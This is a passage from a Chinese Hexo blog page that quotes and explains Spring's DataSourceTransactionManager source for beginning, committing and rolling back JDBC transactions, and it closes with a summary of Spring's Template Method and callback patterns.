                logger.debug<span class="params">(&amp;quot;Acquired Connection [&amp;quot; + newCon + &amp;quot;] for JDBC transaction&amp;quot;)</span>;
            }
            txObject.setConnectionHolder<span class="params">(new ConnectionHolder<span class="params">(newCon)</span>, <span class="literal">true</span>)</span>;
        }
        txObject.getConnectionHolder<span class="params">()</span>.setSynchronizedWithTransaction<span class="params">(<span class="literal">true</span>)</span>;
        con = txObject.getConnectionHolder<span class="params">()</span>.getConnection<span class="params">()</span>;
        Integer previousIsolationLevel = DataSourceUtils.prepareConnectionForTransaction<span class="params">(con, definition)</span>;
        txObject.setPreviousIsolationLevel<span class="params">(previousIsolationLevel)</span>;
        <span class="comment">// Switch to manual commit if necessary. This is very expensive in some JDBC drivers,</span>
        <span class="comment">// so we don&amp;apos;t want to do it unnecessarily (for example if we&amp;apos;ve explicitly</span>
        <span class="comment">// configured the connection pool to set it already).</span>
        <span class="keyword">if</span> <span class="params">(con.getAutoCommit<span class="params">()</span>)</span> {
            txObject.setMustRestoreAutoCommit<span class="params">(<span class="literal">true</span>)</span>;
            <span class="keyword">if</span> <span class="params">(logger.isDebugEnabled<span class="params">()</span>)</span> {
                logger.debug<span class="params">(&amp;quot;Switching JDBC Connection [&amp;quot; + con + &amp;quot;] to manual commit&amp;quot;)</span>;
            }
            con.setAutoCommit<span class="params">(<span class="literal">false</span>)</span>;
        }
        txObject.getConnectionHolder<span class="params">()</span>.setTransactionActive<span class="params">(<span class="literal">true</span>)</span>;
        int timeout = determineTimeout<span class="params">(definition)</span>;
        <span class="keyword">if</span> <span class="params">(timeout != TransactionDefinition.TIMEOUT_DEFAULT)</span> {
            txObject.getConnectionHolder<span class="params">()</span>.setTimeoutInSeconds<span class="params">(timeout)</span>;
        }
        <span class="comment">// Bind the session holder to the thread.</span>
        <span class="keyword">if</span> <span class="params">(txObject.isNewConnectionHolder<span class="params">()</span>)</span> {
            TransactionSynchronizationManager.bindResource<span class="params">(getDataSource<span class="params">()</span>, txObject.getConnectionHolder<span class="params">()</span>)</span>;
        }
    }
    catch <span class="params">(Throwable ex)</span> {
        <span class="keyword">if</span> <span class="params">(txObject.isNewConnectionHolder<span class="params">()</span>)</span> {
            DataSourceUtils.releaseConnection<span class="params">(con, this.dataSource)</span>;
            txObject.setConnectionHolder<span class="params">(null, <span class="literal">false</span>)</span>;
        }
        throw new CannotCreateTransactionException<span class="params">(&amp;quot;Could not open JDBC Connection for transaction&amp;quot;, ex)</span>;
    }
}
</code></pre><p>6.2 &#x4E8B;&#x52A1;&#x63D0;&#x4EA4;</p>
<pre><code>    @Override
protected void doCommit<span class="params">(DefaultTransactionStatus status)</span> {
    DataSourceTransactionObject txObject = <span class="params">(DataSourceTransactionObject)</span> status.getTransaction<span class="params">()</span>;
    Connection con = txObject.getConnectionHolder<span class="params">()</span>.getConnection<span class="params">()</span>;
    <span class="keyword">if</span> <span class="params">(status.isDebug<span class="params">()</span>)</span> {
        logger.debug<span class="params">(&amp;quot;Committing JDBC transaction on Connection [&amp;quot; + con + &amp;quot;]&amp;quot;)</span>;
    }
    try {
        con.commit<span class="params">()</span>;
    }
    catch <span class="params">(SQLException ex)</span> {
        throw new TransactionSystemException<span class="params">(&amp;quot;Could not commit JDBC transaction&amp;quot;, ex)</span>;
    }
}
</code></pre><p>6.3 &#x4E8B;&#x52A1;&#x56DE;&#x6EDA;</p>
<pre><code>@Override
protected void doRollback<span class="params">(DefaultTransactionStatus status)</span> {
    DataSourceTransactionObject txObject = <span class="params">(DataSourceTransactionObject)</span> status.getTransaction<span class="params">()</span>;
    Connection con = txObject.getConnectionHolder<span class="params">()</span>.getConnection<span class="params">()</span>;
    <span class="keyword">if</span> <span class="params">(status.isDebug<span class="params">()</span>)</span> {
        logger.debug<span class="params">(&amp;quot;Rolling back JDBC transaction on Connection [&amp;quot; + con + &amp;quot;]&amp;quot;)</span>;
    }
    try {
        con.rollback<span class="params">()</span>;
    }
    catch <span class="params">(SQLException ex)</span> {
        throw new TransactionSystemException<span class="params">(&amp;quot;Could not roll back JDBC transaction&amp;quot;, ex)</span>;
    }
}
</code></pre><p>&#x5C0F;&#x7ED3;&#xFF1A;</p>
<pre><code><span class="tag">JdbcTemplate</span>&amp;<span class="id">#x5C06</span>;&amp;<span class="id">#x6211</span>;&amp;<span class="id">#x4EEC</span>;&amp;<span class="id">#x4F7F</span>;&amp;<span class="id">#x7528</span>;&amp;<span class="id">#x7684</span>;<span class="tag">JDBC</span>&amp;<span class="id">#x7684</span>;&amp;<span class="id">#x6D41</span>;&amp;<span class="id">#x7A0B</span>;&amp;<span class="id">#x5C01</span>;&amp;<span class="id">#x88C5</span>;&amp;<span class="id">#x8D77</span>;&amp;<span class="id">#x6765</span>;&amp;<span class="id">#xFF0C</span>;&amp;<span class="id">#x5305</span>;&amp;<span class="id">#x62EC</span>;&amp;<span class="id">#x4E86</span>;&amp;<span class="id">#x5F02</span>;&amp;<span class="id">#x5E38</span>;&amp;<span class="id">#x7684</span>;&amp;<span class="id">#x6355</span>;&amp;<span class="id">#x6349</span>;&amp;<span class="id">#x3001</span>;<span class="tag">SQL</span>&amp;<span class="id">#x7684</span>;&amp;<span class="id">#x6267</span>;&amp;<span class="id">#x884C</span>;&amp;<span class="id">#x3001</span>;&amp;<span class="id">#x67E5</span>;&amp;<span class="id">#x8BE2</span>;&amp;<span class="id">#x7ED3</span>;&amp;<span class="id">#x679C</span>;&amp;<span class="id">#x7684</span>;&amp;<span class="id">#x8F6C</span>;&amp;<span class="id">#x6362</span>;&amp;<span class="id">#x7B49</span>;&amp;<span class="id">#x7B49</span>;&amp;<span class="id">#x3002</span>;  
</code></pre><p>spring&#x5927;&#x91CF;&#x4F7F;&#x7528;Template Method&#x6A21;&#x5F0F;&#x6765;&#x5C01;&#x88C5;&#x56FA;&#x5B9A;&#x6D41;&#x7A0B;&#x7684;&#x52A8;&#x4F5C;&#xFF0C;XXXTemplate&#x7B49;&#x7C7B;&#x522B;&#x90FD;&#x662F;&#x57FA;&#x4E8E;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x7684;&#x5B9E;&#x73B0;&#x3002;<br> &#x9664;&#x4E86;&#x5927;&#x91CF;&#x4F7F;&#x7528;Template Method&#x6765;&#x5C01;&#x88C5;&#x4E00;&#x4E9B;&#x5E95;&#x5C42;&#x7684;&#x64CD;&#x4F5C;&#x7EC6;&#x8282;&#xFF0C;spring&#x4E5F;&#x5927;&#x91CF;&#x4F7F;&#x7528;callback&#x65B9;&#x5F0F;&#x7C7B;&#x56DE;&#x8C03;&#x76F8;&#x5173;&#x7C7B;&#x522B;&#x7684;&#x65B9;&#x6CD5;&#x4EE5;&#x63D0;&#x4F9B;JDBC&#x76F8;&#x5173;&#x7C7B;&#x522B;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4F7F;&#x4F20;&#x7EDF;&#x7684;JDBC&#x7684;&#x4F7F;&#x7528;&#x8005;&#x4E5F;&#x80FD;&#x6E05;&#x695A;&#x4E86;&#x89E3;spring&#x6240;&#x63D0;&#x4F9B;&#x7684;&#x76F8;&#x5173;&#x5C01;&#x88C5;&#x7C7B;&#x522B;&#x65B9;&#x6CD5;&#x7684;&#x4F7F;&#x7528;&#x3002;</p>
<p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/meYF3ir">Java&#x77E5;&#x591A;&#x5C11;&#xFF08;85&#xFF09;&#x6587;&#x672C;&#x6846;&#x548C;&#x6587;&#x672C;&#x533A;</a></li>
<li>2.<a href="/articles/b2eMne7">&#x518D;&#x56DE;&#x9996;&#xFF0C;Java&#x6E29;&#x6545;&#x77E5;&#x65B0;&#xFF08;&#x516B;&#xFF09;&#xFF1A;Java&#x57FA;&#x7840;&#x4E4B;&#x5B57;&#x7B26;&#x4E32;</a></li>
<li>3.<a href="/articles/za2Efm3">Java PermGen &#x53BB;&#x54EA;&#x91CC;&#x4E86;?</a></li>
<li>4.<a href="/articles/677JjyM">&#x4F7F;&#x7528;Ant&#x81EA;&#x52A8;&#x5316;&#x6211;&#x4EEC;&#x7684;java&#x9879;&#x76EE;&#x751F;&#x6210;</a></li>
<li>5.<a href="/articles/y6jEj23">Java&#x77E5;&#x591A;&#x5C11;&#xFF08;84&#xFF09;&#x56FE;&#x5F62;&#x754C;&#x9762;&#x4E4B;&#x5E03;&#x5C40;&#x8BBE;&#x8BA1;</a></li>
<li><p>6.<a href="/articles/vaMvIzm">&#x5173;&#x4E8E;Java&#x914D;&#x7F6E;&#x6587;&#x4EF6;properties&#x7684;&#x5B66;&#x4E60;</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/jMVF7bI">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;jMVF7bI&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/JDBC/">JDBC</a><a href="/tags/Spring/">Spring</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>







  <nav id="page-nav" class="clearfix">
    <a class="extend prev" rel="prev" href="/page/2/"><span></span>Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next<span></span></a>
  </nav>

</div>
      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
<aside class="clearfix">

  
<div class="categorieslist">
	<p class="asidetitle">分类</p>
		<ul>
		
		  
			<li><a href="/categories/transcribe/" title="transcribe">transcribe<sup>51</sup></a></li>
		  
		
		  
			<li><a href="/categories/日志/" title="日志">日志<sup>1</sup></a></li>
		  
		
		</ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">标签</p>
		<ul class="clearfix">
		
			
				<li><a href="/tags/iOS开发/" title="iOS开发">iOS开发<sup>5</sup></a></li>
			
		
			
				<li><a href="/tags/JavaScript/" title="JavaScript">JavaScript<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/Html/" title="Html">Html<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/技术/" title="技术">技术<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/加密解密/" title="加密解密">加密解密<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/MVC模式/" title="MVC模式">MVC模式<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/Hadoop/" title="Hadoop">Hadoop<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/数据库/" title="数据库">数据库<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/BroadcastReceiver/" title="BroadcastReceiver">BroadcastReceiver<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/JDBC/" title="JDBC">JDBC<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/Socket/" title="Socket">Socket<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/计算机病毒/" title="计算机病毒">计算机病毒<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/Spring/" title="Spring">Spring<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/Oracle数据库/" title="Oracle数据库">Oracle数据库<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/Http/" title="Http">Http<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/keepalived/" title="keepalived">keepalived<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/MacOS/" title="MacOS">MacOS<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/MacBook/" title="MacBook">MacBook<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/网络安全/" title="网络安全">网络安全<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/Net/" title=".Net">.Net<sup>2</sup></a></li>
			
		
		</ul>
</div>


<div class="weiboshow">
	<p class="asidetitle">新浪微博</p>
	<iframe width="100%" height="550" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=550&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=1289635200&verifier=e6bef170&dpc=1"></iframe>
</div>


  <div class="linkslist">
  <p class="asidetitle">友情链接</p>
    <ul>
        
          <li>
            
            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
            
          </li>
        
          <li>
            
            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
            
          </li>
        
    </ul>
</div>

  


  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
</div>

</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p> Hello ,I&#39;m Larry Page in Google. <br/>
			This is my blog,believe it or not.</p>
	</section>
	 
	<div class="social-font" class="clearfix">
		
		<a href="http://weibo.com/512316815" target="_blank" class="icon-weibo" title="微博"></a>
		
		
		<a href="https://github.com/sblig" target="_blank" class="icon-github" title="github"></a>
		
		
		
		
		
		
		
		
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/sblig" target="_blank" title="fblog">fblog</a> © 2015
		
		<a href="/about" target="_blank" title="edwin">edwin</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
        
    }
  });
});
</script>










<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->





<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  </body>
 </html>
